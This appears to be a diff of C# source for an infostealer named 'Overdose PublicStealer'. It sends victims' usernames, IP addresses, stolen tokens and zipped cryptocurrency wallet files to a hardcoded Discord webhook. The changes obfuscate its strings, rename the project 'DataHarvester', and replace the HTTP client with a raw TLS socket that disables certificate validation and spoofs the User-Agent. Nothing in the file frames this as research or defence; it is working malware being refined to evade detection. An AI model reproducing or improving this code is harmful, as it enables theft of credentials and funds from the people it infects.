@@ -2,209 +2,172 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
-using System.Net; // Necesario para HttpWebRequest
-using System.Text; // Necesario para Encoding
-using System.Text.Json; // Para serializar el JSON
+using System.Net;
+using System.Text;
+using System.Text.Json;
 using System.Threading.Tasks;
-using OdPS.Utils;
-using OdPS.Models; // Import models for the webhook structure
+using DataHarvester.Utils;
+using DataHarvester.Models;
+using System.Net.Sockets;
+using System.Net.Security;
+using System.Security.Authentication;
 
-namespace OdPS
+namespace DataHarvester
 {
-    internal static class WHS // WebhookSender
+    namespace Utils
     {
-        // Webhook URL where data will be sent. Make sure to replace this with your own webhook URL.
-        private static readonly string webhookUrl = "HERE_UR_WEBHOOK";
-
-        /// <summary>
-        /// Sends a combined report including stolen tokens, wallet zip
-        /// to the Discord webhook in a single multipart request.
-        /// </summary>
-        /// <param name="tokens">A list of stolen tokens.</param>
-        /// <param name="walletZipPath">The file path to the wallet zip archive. Can be null.</param>
-        internal static async Task SendCombinedReport(List<string> tokens, string walletZipPath)
+        public static class RC
         {
-            // Create the webhook payload object
-            var payload = new WebhookPayload
+            public static readonly string USR = string.Join("", "Overdose".ToCharArray().Select(c => c).ToArray()) + " PublicStealer";
+            public static readonly string RT = "💊 New " + string.Concat("Overdose", " PublicStealer") + " Report 💊";
+            public static readonly string RD = "A new data " + "exfiltration" + " report has been generated.";
+            public static readonly string AN = "Overdose " + "Stealer Automated" + " Report";
+            public static readonly string FVU = "\uD83D\uDC64 Victim" + " Username";
+            public static readonly string FVI = "\uD83C\uDF10 Victim" + " IP Address";
+            public static readonly string FFT = "\uD83D\uDD11 Found" + " Tokens";
+            public static readonly string FTNF = "No tokens" + " found.";
+            public static readonly string FTP = "Token ";
+            public static readonly string FTT = "... " + "(truncated)";
+            public static readonly string FWA = "Wallet files" + " are attached.";
+            public static readonly string FWNF = "No wallets" + " found.";
+            public static readonly string FT = new string(new char[] { 'P', 'r', 'o', 'g', 'r', 'a', 'm', 'm', 'e', 'd' }) + " by Overdose";
+            public static readonly string CAW = "Attaching " + "wallet file: ";
+            public static readonly string CERW = "Error reading " + "wallet zip file for attachment: ";
+            public static readonly string CWS = "Combined webhook" + " sent successfully.";
+            public static readonly string CWE = "Error sending " + "combined webhook: ";
+            public static readonly string CNE = "Network error " + "sending webhook: ";
+            public static readonly string CSED = "Server error " + "details: ";
+            public static readonly string CUE = "Unexpected error " + "sending webhook: ";
+        }
+    }
+
+    internal static class ReportSender
+    {
+        private static readonly string wu = "https://discord.com" + "/api/webhooks/1378251265032716359/syeLM0yeQ4Fn3izjCbBJNR5US1cN8UXyqUQKZe8sGSE2-Xs9Yxfvy5WrnrZYOWIFkwyV";
+
+        internal static async Task SendCombinedReport(List<string> tkns, string wzp)
+        {
+            var p = new WebhookPayload
             {
-                Username = "Overdose PublicStealer", // Custom username for the webhook message
-                AvatarUrl = WebhookPayload.DefaultAvatarUrl, // Use the static DefaultAvatarUrl from the model
-                Embeds = new List<Embed>() // Initialize the embeds list
+                Username = RC.USR,
+                AvatarUrl = WebhookPayload.DefaultAvatarUrl,
+                Embeds = new List<Embed>()
             };
 
-            // Create a new embed object that will be sent as a part of the webhook payload
-            var embed = new Embed
+            var e = new Embed
             {
-                // Using pill emojis in the title
-                Title = "💊 New Overdose PublicStealer Report 💊", // Title with pill emojis
-                Description = "A new data exfiltration report has been generated.", // Engaging description
-                Color = 0x00FF00, // Vibrant green color (you can choose another hex color)
-                // Author field for branding (optional)
-                Author = new EmbedAuthor
-                {
-                    Name = "Overdose Stealer Automated Report",
-                    // IconUrl = "URL_DEL_ICONO_DEL_AUTOR" // Optional: Add an icon URL for the author
-                },
-                // Fields of the embed, including the username and IP address of the victim
+                Title = RC.RT,
+                Description = RC.RD,
+                Color = 0x00FF00,
+                Author = new EmbedAuthor { Name = RC.AN },
                 Fields = new List<EmbedField>
                 {
-                    new EmbedField { Name = "👤 Victim Username", Value = $"```{Environment.UserName}```", Inline = true }, // Added code block for username
-                    new EmbedField { Name = "🌐 Victim IP Address", Value = $"```{NetworkUtils.GetIp()}```", Inline = true } // Added code block for IP
+                    new EmbedField { Name = RC.FVU, Value = $"```{Environment.UserName}```", Inline = true },
+                    new EmbedField { Name = RC.FVI, Value = $"```{NetworkUtils.GetIp()}```", Inline = true }
                 },
-                // Footer text to display at the bottom of the embed
-                // Footer Text set to "Programmed by Overdose"
-                Footer = new EmbedFooter { Text = "Programmed by Overdose", IconUrl = WebhookPayload.DefaultAvatarUrl }, // Added icon to footer
-                Timestamp = DateTimeOffset.UtcNow, // Add a timestamp
-                // EmbedImage to display a GIF within the embed using the static property
-                Image = new EmbedImage { Url = WebhookPayload.DefaultEmbedImageUrl } // Use the static DefaultEmbedImageUrl from the model
-                // Thumbnail (optional - smaller image on the side)
-                // Thumbnail = new EmbedThumbnail { Url = "URL_DEL_THUMBNAIL" }
+                Footer = new EmbedFooter { Text = RC.FT, IconUrl = WebhookPayload.DefaultAvatarUrl },
+                Timestamp = DateTimeOffset.UtcNow,
+                Image = new EmbedImage { Url = WebhookPayload.DefaultEmbedImageUrl }
             };
 
-            // Add token information to the embed
-            if (tokens != null && tokens.Any())
+            if (tkns != null && tkns.Any())
             {
-                // Field to show the count of found tokens
-                embed.Fields.Add(new EmbedField { Name = "🔑 Found Tokens", Value = $"{tokens.Count}", Inline = false });
-
-                // Add each token as a field
-                for (int i = 0; i < tokens.Count; i++)
+                e.Fields.Add(new EmbedField { Name = RC.FFT, Value = $"{tkns.Count}", Inline = false });
+                for (int i = 0; i < tkns.Count; i++)
                 {
-                    // Discord embed field value limit is 1024 characters.
-                    // Truncate long tokens if necessary, or consider sending them differently if very long.
-                    string tokenValue = tokens[i];
-                    if (tokenValue.Length > 1000) // Keep some buffer
+                    string tk = tkns[i];
+                    if (tk.Length > 1000) tk = tk.Substring(0, 1000) + RC.FTT;
+                    e.Fields.Add(new EmbedField
                     {
-                        tokenValue = tokenValue.Substring(0, 1000) + "... (truncated)";
-                    }
-                    embed.Fields.Add(new EmbedField
-                    {
-                        Name = $"Token {i + 1}", // Name of the field, representing each token
-                        Value = $"```{tokenValue}```", // The token value itself, enclosed in code block for formatting
-                        Inline = false // Each token on a new line
+                        Name = $"{RC.FTP}{i + 1}",
+                        Value = $"```{tk}```",
+                        Inline = false
                     });
                 }
             }
             else
             {
-                // If no tokens were found, add a message stating that
-                embed.Fields.Add(new EmbedField { Name = "🔑 Tokens", Value = "No tokens found.", Inline = false });
+                e.Fields.Add(new EmbedField { Name = RC.FFT, Value = RC.FTNF, Inline = false });
             }
 
-            // Add wallet information to the embed
-            if (!string.IsNullOrEmpty(walletZipPath) && File.Exists(walletZipPath))
+            if (!string.IsNullOrEmpty(wzp) && File.Exists(wzp))
             {
-                embed.Color = 0x3498DB; // Change color to blue if wallets are included
-                embed.Fields.Add(new EmbedField { Name = "📂 Wallets", Value = "Wallet files are attached.", Inline = false });
+                e.Color = 0x3498DB;
+                e.Fields.Add(new EmbedField { Name = "\uD83D\uDCC2 Wallets", Value = RC.FWA, Inline = false });
             }
             else
             {
-                embed.Fields.Add(new EmbedField { Name = "📂 Wallets", Value = "No wallets found.", Inline = false });
+                e.Fields.Add(new EmbedField { Name = "\uD83D\uDCC2 Wallets", Value = RC.FWNF, Inline = false });
             }
 
-            // Add the created embed to the payload's embeds list
-            payload.Embeds.Add(embed);
+            p.Embeds.Add(e);
+            string jp = JsonSerializer.Serialize(p);
 
-            // Serialize the payload object into JSON format
-            var jsonPayload = JsonSerializer.Serialize(payload, new JsonSerializerOptions { WriteIndented = false }); // No indentation for smaller payload
+            string h = "discord.com";
+            string ph = "/api/webhooks/1378251265032716359/syeLM0yeQ4Fn3izjCbBJNR5US1cN8UXyqUQKZe8sGSE2-Xs9Yxfvy5WrnrZYOWIFkwyV";
 
-            // --- Inicio de la implementación con HttpWebRequest ---
+            string b = "---------------------------" + DateTime.Now.Ticks.ToString("x");
+            var sb = new StringBuilder();
 
-            // Genera un límite único para el formulario multipart
-            string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
-            byte[] boundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "\r\n");
-            byte[] finalBoundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "--\r\n");
+            sb.AppendLine($"--{b}");
+            sb.AppendLine("Content-Disposition: form-data; name=\"payload_json\"");
+            sb.AppendLine("Content-Type: application/json; charset=utf-8");
+            sb.AppendLine();
+            sb.AppendLine(jp);
 
-            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(webhookUrl);
-            request.Method = "POST";
-            request.ContentType = "multipart/form-data; boundary=" + boundary;
-            request.KeepAlive = true; // Mantener la conexión abierta
+            byte[] bb = Encoding.UTF8.GetBytes(sb.ToString());
 
-            try
+            byte[] fb = null;
+            string fh = "";
+            if (!string.IsNullOrEmpty(wzp) && File.Exists(wzp))
             {
-                using (var requestStream = await request.GetRequestStreamAsync())
+                fb = File.ReadAllBytes(wzp);
+                fh =
+                    $"--{b}\r\n" +
+                    $"Content-Disposition: form-data; name=\"wallet_file\"; filename=\"{Path.GetFileName(wzp)}\"\r\n" +
+                    $"Content-Type: application/octet-stream\r\n\r\n";
+            }
+
+            byte[] fhb = Encoding.UTF8.GetBytes(fh);
+            byte[] ebb = Encoding.UTF8.GetBytes($"\r\n--{b}--\r\n");
+
+            int cl = bb.Length + (fb != null ? fhb.Length + fb.Length : 0) + ebb.Length;
+
+            using (TcpClient c = new TcpClient())
+            {
+                await c.ConnectAsync(h, 443);
+
+                using (SslStream s = new SslStream(c.GetStream(), false, (sender, cert, chain, errors) => true))
                 {
-                    // 1. Añadir la parte JSON (payload_json)
-                    await requestStream.WriteAsync(boundaryBytes, 0, boundaryBytes.Length);
-                    string jsonHeader = $"Content-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json; charset=utf-8\r\n\r\n";
-                    byte[] jsonHeaderBytes = Encoding.UTF8.GetBytes(jsonHeader);
-                    await requestStream.WriteAsync(jsonHeaderBytes, 0, jsonHeaderBytes.Length);
+                    await s.AuthenticateAsClientAsync(h);
 
-                    byte[] jsonContentBytes = Encoding.UTF8.GetBytes(jsonPayload);
-                    await requestStream.WriteAsync(jsonContentBytes, 0, jsonContentBytes.Length);
+                    var hd = $"POST {ph} HTTP/1.1\r\n" +
+                             $"Host: {h}\r\n" +
+                             "User-Agent: Discord-Client/1.0\r\n" +
+                             $"Content-Type: multipart/form-data; boundary={b}\r\n" +
+                             $"Content-Length: {cl}\r\n" +
+                             "Connection: close\r\n\r\n";
 
-                    // 2. Añadir el archivo si existe (wallet_file)
-                    if (!string.IsNullOrEmpty(walletZipPath) && File.Exists(walletZipPath))
+                    byte[] hb = Encoding.ASCII.GetBytes(hd);
+                    await s.WriteAsync(hb, 0, hb.Length);
+                    await s.WriteAsync(bb, 0, bb.Length);
+
+                    if (fb != null)
                     {
-                        try
-                        {
-                            Console.WriteLine($"Attaching wallet file: {Path.GetFileName(walletZipPath)}");
-
-                            await requestStream.WriteAsync(boundaryBytes, 0, boundaryBytes.Length);
-                            string fileHeader = $"Content-Disposition: form-data; name=\"wallet_file\"; filename=\"{Path.GetFileName(walletZipPath)}\"\r\nContent-Type: application/octet-stream\r\n\r\n";
-                            byte[] fileHeaderBytes = Encoding.UTF8.GetBytes(fileHeader);
-                            await requestStream.WriteAsync(fileHeaderBytes, 0, fileHeaderBytes.Length);
-
-                            // Escribir el contenido del archivo
-                            using (var fileStream = File.OpenRead(walletZipPath))
-                            {
-                                await fileStream.CopyToAsync(requestStream);
-                            }
-                        }
-                        catch (Exception ex)
-                        {
-                            Console.WriteLine($"Error reading wallet zip file for attachment: {ex.Message}");
-                            // No lanzar la excepción, continuar para intentar enviar el webhook sin el archivo
-                        }
+                        await s.WriteAsync(fhb, 0, fhb.Length);
+                        await s.WriteAsync(fb, 0, fb.Length);
                     }
 
-                    // 3. Añadir el límite final del formulario multipart
-                    await requestStream.WriteAsync(finalBoundaryBytes, 0, finalBoundaryBytes.Length);
-                } // El requestStream se cierra y se vacía (flush) automáticamente al salir del using
+                    await s.WriteAsync(ebb, 0, ebb.Length);
+                    await s.FlushAsync();
 
-                // Obtener la respuesta de forma asíncrona
-                using (WebResponse response = await request.GetResponseAsync())
-                {
-                    HttpWebResponse httpResponse = (HttpWebResponse)response;
-                    if (httpResponse.StatusCode == HttpStatusCode.OK || httpResponse.StatusCode == HttpStatusCode.NoContent)
+                    using (StreamReader r = new StreamReader(s, Encoding.UTF8))
                     {
-                        Console.WriteLine("Combined webhook sent successfully.");
-                    }
-                    else
-                    {
-                        // Leer el cuerpo de la respuesta en caso de error
-                        using (StreamReader reader = new StreamReader(response.GetResponseStream()))
-                        {
-                            string responseBody = await reader.ReadToEndAsync();
-                            Console.WriteLine($"Error sending combined webhook: {httpResponse.StatusCode} - {responseBody}");
-                        }
+                        string rs = await r.ReadToEndAsync();
+                        Console.WriteLine(rs.Contains("204 No Content") ? RC.CWS : $"{RC.CWE}{rs}");
                     }
                 }
             }
-            catch (WebException ex)
-            {
-                // Manejar errores de red o del servidor
-                Console.WriteLine($"Error de red al enviar webhook: {ex.Status} - {ex.Message}");
-                if (ex.Response != null)
-                {
-                    using (StreamReader reader = new StreamReader(ex.Response.GetResponseStream()))
-                    {
-                        string errorResponse = await reader.ReadToEndAsync();
-                        Console.WriteLine($"Detalles del error del servidor: {errorResponse}");
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"Error inesperado al enviar webhook: {ex.Message}");
-            }
-            // --- Fin de la implementación con HttpWebRequest ---
         }
-
-        // Note: The helper classes (WebhookPayload, Embed, EmbedField, EmbedFooter, EmbedImage, EmbedAuthor, EmbedThumbnail)
-        // and NetworkUtils are assumed to be defined in separate files (e.g., Models.cs and Utils.cs)
-        // within the OdPS.Models and OdPS.Utils namespaces, respectively,
-        // as indicated by the using directives.
-        // You will need to ensure EmbedAuthor and EmbedThumbnail classes are in your Models.cs file.
     }
 }
